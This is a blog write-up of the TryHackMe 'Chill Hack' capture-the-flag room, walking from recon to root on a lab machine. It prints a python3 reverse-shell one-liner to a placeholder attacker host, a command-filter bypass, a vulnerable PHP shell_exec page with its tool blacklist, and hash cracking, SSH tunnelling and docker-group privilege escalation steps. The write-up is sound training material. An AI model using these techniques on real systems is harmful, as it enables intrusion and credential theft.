---
layout: post
current: post
cover: 'assets/images/chillhack/cover.png'
navigation: True
title: Chill Hack Write Up
date: 2020-12-05 00:00:00
tags: [tryhackme, ctf, easy]
class: post-template
subclass: 'post'
author: darryn
---
![Chillhack](/assets/images/chillhack/cover.png)

### Overview

[Chillhack](https://tryhackme.com/room/chillhack) is a great boot2root machine from [TryHackMe](https://tryhackme.com). Credit to [Anurodh](https://twitter.com/acharya_anurodh) for a great room. It felt like this machine had everything chaining lots of elements together to finally get SSH access as a user then a simple priv esc to root.  We have two tasks to complete, obtain the user and root flags.

### Nmap

```highlight
└──╼ $sudo nmap -sC -sV -oA nmap/initial 10.10.226.46
Starting Nmap 7.80 ( https://nmap.org ) at 2020-12-05 11:06 GMT
Nmap scan report for 10.10.226.46
Host is up (0.028s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1001     1001           90 Oct 03 04:33 note.txt
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 09:f9:5d:b9:18:d0:b2:3a:82:2d:6e:76:8c:c2:01:44 (RSA)
|   256 1b:cf:3a:49:8b:1b:20:b0:2c:6a:a5:51:a8:8f:1e:62 (ECDSA)
|_  256 30:05:cc:52:c6:6f:65:04:86:0f:72:41:c8:a4:39:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Game Info
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.79 seconds
```

3 Ports open:

- 21 - FTP - Anonymous login allowed with a note.txt file
- 22 - SSH - Banner is showing its an Ubuntu machine
- 80 - HTTP - Apache web server version 2.4.29

I also ran a full port scan but no additional ports were found.

### Enumeration

First I had a look at the note on the FTP server. I logged in with the anonymous account and downloaded the file. The note reads:

"Anurodh told me that there is some filtering on strings being put in the command -- Apaar"

No idea what this is related to yet so I started to look at the web server. I kicked off a gobuster while I had a click around the webpages. 

```highlight
└──╼ $gobuster dir -u http://10.10.226.46 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.226.46
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/12/05 11:12:39 Starting gobuster
===============================================================
/images (Status: 301)
/css (Status: 301)
/js (Status: 301)
/fonts (Status: 301)
/secret (Status: 301)
/server-status (Status: 403)
===============================================================
2020/12/05 11:14:34 Finished
===============================================================
```

Clicking around didnt reveal much however the gobuster found the directory /secret

![command](/assets/images/chillhack/command.png)

This must be what the note is refering to. I started with some basics commands to see what was possible such as whoami, pwd, date which were all successful and returned a response. 

![wwwdata](/assets/images/chillhack/wwwdata.png)

However when I tried ls or 'cat /etc/passwd' I got an alert! However I didn't get blocked so I could keep testing commands.

![hacker](/assets/images/chillhack/hacker.png)

### Initial Access

Based on the recon so far I was confident my foothold would be via the /secret directory and bypassing the command filter I might be able to either get a SSH key or reverse shell. 

I tried testing various commands and found I was able to bypass the filter using quotes. When I tried to run 'ls' before it failed however when I put the command in quotes I get a response. 

![lsworked](/assets/images/chillhack/lsworked.png)

I started a netcat listener on my attacker VM I tried a couple of reverse shell one liners but finally got success with python3.

\`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACK VM",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'\`

```highlight
└──╼ $nc -nvlp 4444
listening on [any] 4444 ...
connect to [ATTACK VM] from (UNKNOWN) [10.10.226.46] 45160
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

We have a shell! Looking at index.php shows the blacklist.

```highlight
<html>                                                                                                                             
<body>                                                                                                                             
                                                                                                                                   
<form method="POST">                                                                                                               
        <input id="comm" type="text" name="command" placeholder="Command">                                                         
        <button>Execute</button>                                                                                                   
</form>                                                                                                                            
<?php                                                                                                                              
        if(isset($_POST['command']))                                                                                               
        {
                $cmd = $_POST['command'];
                $store = explode(" ",$cmd);
                $blacklist = array('nc', 'python', 'bash','php','perl','rm','cat','head','tail','python3','more','less','sh','ls');
                for($i=0; $i<count($store); $i++)
                {
                        for($j=0; $j<count($blacklist); $j++)
                        {
                                if($store[$i] == $blacklist[$j])
                                {?>
                                        <h1 style="color:red;">Are you a hacker?</h1>
                                        <style>
                                                body
                                                {
                                                        background-image: url('images/FailingMiserableEwe-size_restricted.gif');
                                                        background-position: center center;
                                                        background-repeat: no-repeat;
                                                        background-attachment: fixed;
                                                        background-size: cover;
        }
                                        </style>
<?php                                    return;
                                }
                        }
                }
                ?><h2 style="color:blue;"><?php echo shell_exec($cmd);?></h2>
                        <style>
                             body
                             {
                                   background-image: url('images/blue_boy_typing_nothought.gif');  
                                   background-position: center center;
                                   background-repeat: no-repeat;
                                   background-attachment: fixed;
                                   background-size: cover;
}
                          </style>
        <?php }
?>
</body>
</html>
```

I can see 3 users 'aurick', 'apaar' and 'anurodh' however I could only access apaar's directory but couldn't read any files. I went back to /var/www to enumerate further and found the directory 'files'. Looking at index.php I found a mysql username and password. 

```highlight
$ mysql -u root -p
mysql -u root -p
Enter password: 

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 6
Server version: 5.7.31-0ubuntu0.18.04.1 (Ubuntu)

Copyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;                                            
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| sys                |
| webportal          |
+--------------------+
5 rows in set (0.00 sec)

mysql> use webportal;
use webportal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+---------------------+
| Tables_in_webportal |
+---------------------+
| users               |
+---------------------+
1 row in set (0.00 sec)

mysql> select * from users;
select * from users;
+----+-----------+----------+-----------+----------------------------------+
| id | firstname | lastname | username  | password                         |
+----+-----------+----------+-----------+----------------------------------+
|  1 | Anurodh   | Acharya  | Aurick    | 7e53614ced3640d5de2REDACTED      |
|  2 | Apaar     | Dahal    | cullapaar | 686216240e5af30df05REDACTED      |
+----+-----------+----------+-----------+----------------------------------+
2 rows in set (0.00 sec)
```

Found some users, the passwords look like md5 hashes so I created a file on my attack VM with both hashes in and then ran hashcat to crack them.

```highlight
└──╼ $hashcat -m 0 hashes /usr/share/wordlists/rockyou.txt --force                                         
hashcat (v5.1.0) starting...                                                                               
                                                                                                           
OpenCL Platform #1: The pocl project                                                                       
====================================                                                                       
* Device #1: pthread-Intel(R) Core(TM) i5-7500 CPU @ 3.40GHz, 512/1472 MB allocatable, 2MCU                
                                                                                                           
Hashes: 2 digests; 2 unique digests, 1 unique salts                                                        
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates                               
Rules: 1                                                                                                   
                                                                                                           
Applicable optimizers:                                                                                     
* Zero-Byte                                                                                                
* Early-Skip                                                                                               
* Not-Salted                                                                                               
* Not-Iterated                                                                                             
* Single-Salt                                                                                              
* Raw-Hash                                                                                                 
                                                                                                           
Minimum password length supported by kernel: 0                                                             
Maximum password length supported by kernel: 256                                                           
                                                                                                           
ATTENTION! Pure (unoptimized) OpenCL kernels selected.                                                     
This enables cracking passwords and salts > length 32 but for the price of drastically reduced performance.
If you want to switch to optimized OpenCL kernels, append -O to your commandline.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 2 secs

686216240e5af30df05REDACTED:<hidden>
7e53614ced3640d5de2REDACTED:<hidden>  
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Type........: MD5
Hash.Target......: hashes
Time.Started.....: Sat Dec  5 12:08:01 2020 (3 secs)
Time.Estimated...: Sat Dec  5 12:08:04 2020 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  2713.5 kH/s (0.23ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 2/2 (100.00%) Digests, 1/1 (100.00%) Salts
Progress.........: 5736448/14344385 (39.99%)
Rejected.........: 0/5736448 (0.00%)
Restore.Point....: 5734400/14344385 (39.98%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: maston420 -> masta619

Started: Sat Dec  5 12:07:49 2020
Stopped: Sat Dec  5 12:08:05 2020
```

Both hashes successfully cracked. I tried to use them to log in via SSH but that didn't work. I went back to the /var/www/files directory to have a look at what was going on. When a user successfully logged in they were directed to hacker.php. Looking at the hacker.php the following code looked interesting:

```highlight
<center>
        <img src = "images/hacker-with-laptop_23-2147985341.jpg"><br>
        <h1 style="background-color:red;">You have reached this far. </h2>
        <h1 style="background-color:black;">Look in the dark! You will find your answer</h1>
</center>
```

My initial thought was steganography in the hacker image, there are lots of ways I could have copied the images to my attack machine however I could see the webpage was being hosted locally on port 9001 so I used SSH to tunnel the port so I could access the webpage.

```highlight
$ netstat -ntlp                                                                                 
netstat -ntlp                                                                                   
(Not all processes could be identified, non-owned process info                                  
 will not be shown, you would have to be root to see it all.)                                   
Active Internet connections (only servers)                                                      
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:9001          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -               
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -               
tcp6       0      0 :::22                   :::*                    LISTEN      -               
tcp6       0      0 :::80                   :::*                    LISTEN      -               
tcp6       0      0 :::21                   :::*                    LISTEN      -               
```

On the 'victim' machine I issued the command 'ssh -N -R ATTACKERVMIP:9001:127.0.0.1:9001 daz@ATTACKERVMIP'. Now on my attack VM I could web browse to 127.0.0.1:9001 and get access to the login page.

![login](/assets/images/chillhack/login.png)

I logged in with aurick credentials.

![9001](/assets/images/chillhack/9001.png)

Now its simple to just right click and download the hacker image to my machine.  Now the image in on my machine and check for any hidden files.

```highlight
└──╼ $steghide extract -sf hacker-with-laptop_23-2147985341.jpg
Enter passphrase:                                              
wrote extracted data to "backup.zip".                          
```
Using steghide I was able to extract a zip file. However the zip file was password protected.

```highlight
└──╼ $/usr/sbin/zip2john backup.zip > ziphash
ver 2.0 efh 5455 efh 7875 backup.zip/source_code.php PKZIP Encr: 2b chk, TS_chk, cmplen=554, decmplen=1211, crc=69DC82F3
```

Using zip2john I was able to generate the password hash. I extracted the hash from the ziphash output and put in to a new file called newzip. and used the hashcat to crack: hashcat -m 17200 newzip /usr/share/wordlists/rockyou.txt --force

The password cracked successfully, I used the password to unzip the file and got source_code.php. Within the source code was a base64 encoded password.

```highlight
┌─[daz@parrot]─[~/Documents/TryHackMe/ChillHack]
└──╼ $echo IWQwbnRLbjB3bREDACTED | base64 -d
<hidden>
```

I decoded the hash and tried to login using SSH. I was successful with the user anurodh.

Once on the machine I did 'sudo -l' to check if there was a quick win to priv esc. I also checked the users home directory for the user flag, however it was not there.

```highlight
anurodh@ubuntu:/dev/shm$ sudo -l
Matching Defaults entries for anurodh on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User anurodh may run the following commands on ubuntu:
    (apaar : ALL) NOPASSWD: /home/apaar/.helpline.sh
```

No priv esc to root however I could run a script owned by apaar. 

```highlight
anurodh@ubuntu:/$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: aurick   
Hello user! I am aurick,  Please enter your message: id    
uid=1001(apaar) gid=1001(apaar) groups=1001(apaar)
Thank you for your precious time!
anurodh@ubuntu:/$ sudo -u apaar /home/apaar/.helpline.sh

Welcome to helpdesk. Feel free to talk to anyone at any time!

Enter the person whom you want to talk with: aurick
Hello user! I am aurick,  Please enter your message: cat /home/apaar/local.txt
{USER-FLAG: e8vpd3323cfvlp0qpxxx9qREDACTED}
Thank you for your precious time!
anurodh@ubuntu:/$ 
```

I was able to run commands as apaar, when I first got a foot hold one the machine I found a local.txt file in apaar's home directory but was unable to read it. However now I can run commands as the apaar user so I used cat to read the file and got the user flag.

### Priv Esc

I did some enumeration using the apaar user by using the helpline.sh script and the command 'bash -i' to get shell on the box as the apaar user however I didnt find much so I went back to the anurodh user and ran linpeas.

anurodh is a memeber of the docker group, this [blog](https://www.hackingarticles.in/docker-privilege-escalation/) details how a machine can be exploited via docker. 

```highlight
anurodh@ubuntu:/dev/shm$ docker images
REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
alpine              latest              a24bb4013296        6 months ago        5.57MB
hello-world         latest              bf756fb1ae65        11 months ago       13.3kB
anurodh@ubuntu:/dev/shm$ docker run -v /etc/:/mnt -it alpine
/ # cd /mnt
/mnt # cd root
/mnt/root # cat proof.txt 


                                        {ROOT-FLAG: w18gfpn9xehsgd3tovhREDACTED}


Congratulations! You have successfully completed the challenge.
```

Thats root! Thanks for reading!

============================================================

Any comments or feedback welcome! You can find me on [twitter](https://twitter.com/dazbrownfield).

<a href="https://www.buymeacoffee.com/dazbrownfield" target="_blank"><img src="https://cdn.buymeacoffee.com/buttons/v2/default-blue.png" alt="Buy Me A Coffee" style="height: 60px !important;width: 217px !important;" ></a>

